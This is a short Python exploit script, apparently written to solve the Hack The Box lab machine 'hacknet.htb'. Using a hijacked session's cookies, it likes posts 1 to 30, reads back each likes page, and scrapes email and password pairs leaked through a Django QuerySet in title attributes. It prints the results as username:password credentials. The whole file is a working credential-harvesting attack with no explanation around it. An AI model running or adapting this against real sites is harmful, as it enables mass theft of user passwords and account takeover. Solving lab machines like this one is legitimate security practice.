#!/usr/bin/env python3
import requests
import re
import html
import time 

URL_BASE = "http://hacknet.htb"
MIS_COOKIES = {
    'csrftoken': '<YOUR_csrftoken>',
    'sessionid': '<YOUR_sessionid>'
}

def extraer_con_reintento(identificador):
    
    requests.get(f"{URL_BASE}/like/{identificador}", cookies=MIS_COOKIES)
    
    
    res = requests.get(f"{URL_BASE}/likes/{identificador}", cookies=MIS_COOKIES)
    
   
    if "QuerySet" not in res.text:
        requests.get(f"{URL_BASE}/like/{identificador}", cookies=MIS_COOKIES)
        time.sleep(0.2) 
        res = requests.get(f"{URL_BASE}/likes/{identificador}", cookies=MIS_COOKIES)

    
    titulos = re.findall(r'title="([^"]*)"', res.text)
    if not titulos: return []

    texto_limpio = html.unescape(titulos[-1])
    emails = re.findall(r"'email': '([^']*)'", texto_limpio)
    passwords = re.findall(r"'password': '([^']*)'", texto_limpio)
    
    return [f"{e.split('@')[0]}:{p}" for e, p in zip(emails, passwords)]

def main():
    todas_las_creds = set()
    print("Extrayendo todo a la primera... 🚀")

    for i in range(1, 31):
        nuevas = extraer_con_reintento(i)
        todas_las_creds.update(nuevas)
        if nuevas:
            print(f"[+] ID {i} extraído")

    print("\nRESULTADOS:")
    for c in sorted(todas_las_creds):
        print(c)
    
    print("=" * 30)
    print(f"Total: {len(todas_las_creds)} credenciales únicas.")

if __name__ == "__main__":
    main()
